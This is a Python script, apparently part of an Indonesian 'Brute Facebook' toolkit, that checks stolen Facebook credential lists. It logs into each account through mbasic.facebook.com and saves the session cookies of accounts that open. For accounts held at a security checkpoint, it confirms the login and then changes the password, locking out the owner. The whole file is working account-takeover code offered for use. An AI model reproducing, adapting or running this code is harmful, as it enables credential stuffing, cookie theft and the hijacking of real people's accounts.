#######################################################
# Name           : Brute Facebook (BF)                #
# File           : dump.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############


import requests, os, re
from bs4 import BeautifulSoup as par

#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

### WARNA MODULE RICH ###
merah  = '[#FF0022]'
pink   = '[deep_pink3]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
###########################################
class Cek_has:
    def __init__(self):
        self.aman, self.cp, self.salah = 0, 0, 0
        self.ubahP, self.pwBaru = [], []
        self.data, self.data2 = {}, {}
        self.dat, self.dat2 = {}, {}
        self.hsl_cp = []

    def gabut(self):
        try:
            xxx = os.listdir("results/CP")
            for z in xxx:
                self.hsl_cp.append(z)
        except:pass
        if len(self.hsl_cp)==0:
            prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
        else:
            self.xa = {}
            self.xx = 0
            prints(Panel(f"       HASIL {kuning}CP {hapus}YANG TERSIMPAN DI FOLDER ANDA"))
            for tod in self.hsl_cp:
                try:fi2 = open(f"results/CP/{tod}").readlines()
                except:continue
                self.xx+=1
                if self.xx<100:
                    nom = "0"+str(self.xx)
                    self.xa.update({str(self.xx):str(tod)})
                    self.xa.update({nom:str(self.xx)})
                    print(f"  [{O}{nom}{N}] {tod} -> {H}{str(len(fi2))}{N}")
                else:
                    self.xa.update({str(self.xx):str(tod)})
                    print(f"  [{O}{nom}{N}] {tod} -> {H}{str(len(fi2))}{N}")
        prints(Panel(f"   {biru_m}SILAHKAN PILIH NOMOR YANG MAU DI CP DETECTOR{hapus}"))
        file = input(f"  [{M}?{N}] nomor : ")
        try:ajg = self.xa[file]
        except KeyError:
            prints(Panel(f"😡 file {merah}{file}{hapus} tidak ada cek nomor nya pler"));exit()
        try:
            buka_baju = open(f"results/CP/{ajg}").readlines()
        except IOError:
            print(f"  [{M}!{N}] file tidak ada");exit()
        wwx=input(f"  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
        if wwx in ["Y","y"]:
            self.ubahP.append("y")
            prints(Panel("Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [green]yayanxd[/]"))
            pwBar=input(f"  [{H}+{N}] masukan password baru : ")
            if len(pwBar) <= 5:
                print(f"  [{M}!{N}] kata sandi minimal 6 karakter")
            else:
                self.pwBaru.append(pwBar)
        prints(Panel(f"[[bold green]+[/]] Total akun : [bold cyan]{str(len(buka_baju))}[/]"))
        for memek in buka_baju:
            kontol = memek.replace('\n', '')
            titid  = kontol.split('|')
            try:
                #print(titid[0]+"|"+titid[1])
                self.log_hasil(titid[0], titid[1])
            except requests.exceptions.ConnectionError:
                continue
            print("")
        print()
        prints(Panel("[bold green]Proses Pengecekan Selesai[/]"));exit()

    def log_hasil(self, user, pasw):
        ses = requests.Session()
        s = 0
        oppss = []
        tree = Tree("")
        tree.add(f"{user}|{pasw}")
        url = ses.get("https://mbasic.facebook.com/login.php")
        data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),
    		"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
    		"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),
    		"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),
    		"try_number": "0", 
    		"unrecognized_tries": "0", 
    		"email": user, 
    		"pass": pasw, 
    		"login": "Masuk",
    		"bi_xrwh": "0"}
        post = ses.post("https://mbasic.facebook.com/login.php",data=data)
        if "c_user" in ses.cookies.get_dict():
            if "Akun Anda Dikunci" in post.text:
                oppss.append("[!]. akun terkena sesi new")
            else:
                oppss.append(f"[✓]. selamat ini akun OK")
                cooz = post.cookies.get_dict()
                coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                wrt = " [✓] "+user+"|"+pasw+"|"+coki
                with open(f"results/OK/OK.txt", "a", encoding="utf-8") as r:
                    r.write(wrt+"\n")
        elif "checkpoint" in ses.cookies.get_dict():
            parsing1 = par(post.text,"html.parser")
            action1 = parsing1.find("form",{"method":"post"})["action"]
            data2 = {
    			"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(post.text)).group(1),
    			"jazoest":re.search('name="jazoest" value="(.*?)"', str(post.text)).group(1),
    			"checkpoint_data": "",
    			"submit[Continue]": "Lanjutkan",
    			"nh":re.search('name="nh" value="(.*?)"', str(post.text)).group(1)}
            post2 = ses.post("https://mbasic.facebook.com"+action1, data=data2)
            parsing2 = par(post2.text,"html.parser")
            otp = otp = re.findall("\<title>(.*?)<\/title>",str(post2))
            option = parsing2.find_all("option")
            if 'Lihat detail login yang ditampilkan. Ini Anda?' in otp:
                oppss.append("[✓]. selamat akun ini tap yess")
                if "y" in self.ubahP:
                    xxx = self.pwBaru
                    self.ubah_pw(post2, action1, user, xxx)
                else:
                    xxx = "kimochi_ahh"
                    self.ubah_pw(post2, action1, user, xxx)
            else:
                if len(option) == 0:
                    if 'Masukkan Kode Masuk untuk Melanjutkan' in otp:
                        oppss.append("[!]. akun ini terpasang sistem a2f")
                else:
                    for opsi in option:
                        s +=1
                        oppss.append(f"[{str(s)}]. {opsi.text}")
        else:
            oppss.append("[!]. terjadi error saat cek opsi pada akun ini")
        tree.add(f"terdapat {str(len(option))} opsi sesi :").add(f"{''.join(oppss)}")
        prints(tree)

    def ubah_pw(self, response, link2, user, pwx):
        session=requests.Session()
        but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
        for x in response("input"):
            if x.get("name") in but:
                self.dat.update({x.get("name"):x.get("value")})
        ubahPw=session.post("https://mbasic.facebook.com"+link2.get("action"),data=self.dat).text
        resUbah=par(ubahPw,"html.parser")
        link3=resUbah.find("form",{"method":"post"})
        but2=["submit[Next]","nh","fb_dtsg","jazoest"]
        if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
            for b in resUbah("input"):
                if b.get("name") in but2:
                    self.dat2.update({b.get("name"):b.get("value")})
            self.dat2.update({"password_new":"".join(pwx)})
            an=session.post("https://mbasic.facebook.com"+link3.get("action"),data=self.dat2)
            cooz = session.cookies.get_dict()
            coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
            open('results/OK/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(pwx)}|{coki}\n")
            prints(Panel(f"\r[{hijau}✓[/]] {hijau}{user}|{''.join(pwx)}|{coki}[/]", title=f"{hijau}TAB YES[/]"))
